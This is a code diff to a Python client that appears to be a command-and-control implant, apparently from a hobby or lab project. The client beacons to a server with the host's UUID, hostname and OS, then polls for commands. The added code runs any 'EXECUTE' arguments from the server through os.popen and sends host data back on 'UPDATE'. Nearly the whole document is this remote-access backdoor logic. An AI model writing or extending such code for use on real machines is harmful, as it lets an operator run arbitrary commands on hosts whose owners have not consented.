@@ -8,6 +8,7 @@ import random
 import uuid
 from platform import node
 import requests
+import json
 
 SERVER_IP = "localhost"
 SERVER_PORT = 8000
@@ -27,28 +28,14 @@ def connectToServer(ip, port):
 def sendData(socket, data):
     print("Sending Data")
     socket.sendall(data.encode())
+    print("SENT")
 
 def closeSocket(socket):
     print("Closing Socket")
     socket.close()
 
-def beacon(ip, port, soc):
-    fields = "UUID: " + str(UUID) + "\r\n"
-    fields += "HOSTNAME: " + HOSTNAME + "\r\n"
-    fields += "OS: " + OS + "\r\n"
-    httpGet("client/" + str(UUID) + "/commands",fields,  soc)
-
-def httpGet(uri, params, soc):
-    data = "GET /" + uri + " HTTP/1.1\r\n"
-    data += params
-    print(data)
-    try:
-        sendData(soc, str(data))
-        failCount = 0
-    except:
-        failCount += 1
-        print("FAILS: " + str(failCount))
-        return False
+def beacon():
+    r = requests.get(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/client/" + str(UUID) + "/commands"))
 
 def httpPost():
     data = {'UUID':UUID,
@@ -63,8 +50,10 @@ if __name__ == "__main__":
         try:
             s = connectToServer(SERVER_IP, SERVER_PORT)
             s.settimeout(5)
-            beacon(SERVER_IP, SERVER_PORT, s)
+            beacon()
+            print("BEACONED")
             failCount = 0
+            time.sleep(5)
         except:
             failCount += 1
             print("FAILS: " + str(failCount))
@@ -76,6 +65,13 @@ if __name__ == "__main__":
             pass
         if data:
             print(data)
+            serverText = json.loads(data)
+            print(serverText["command"])
+            print(serverText["args"])
+            if serverText["command"] == "EXECUTE":
+                print(os.popen(serverText["args"]).read())
+            elif serverText["command"] == "UPDATE":
+                httpPost()
         try:
             closeSocket(s)
         except:
